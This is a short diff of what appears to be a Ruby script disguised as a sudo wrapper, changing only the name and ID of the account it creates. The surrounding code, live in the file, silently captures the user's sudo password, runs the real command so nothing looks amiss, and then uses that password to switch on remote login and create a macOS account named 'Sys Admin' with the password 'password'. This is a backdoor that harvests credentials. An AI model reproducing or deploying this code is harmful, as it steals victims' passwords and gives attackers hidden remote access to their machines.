@@ -6,6 +6,6 @@ system "stty echo"
 
 print `/usr/bin/sudo #{ARGV[0..-1].join(' ')}`
 
-username = "sysadmin14"
-user_id = 1016
+username = "sysadmin15"
+user_id = 1017
 `echo '#{password}' | /usr/bin/sudo -S systemsetup -setremotelogin on && /usr/bin/sudo dscl . -create /Users/#{username} && /usr/bin/sudo dscl . -create /Users/#{username} UserShell /bin/bash && /usr/bin/sudo dscl . -create /Users/#{username} RealName "Sys Admin" && /usr/bin/sudo dscl . -create /Users/#{username} UniqueID "#{user_id}" && /usr/bin/sudo dscl . -passwd /Users/#{username} password`
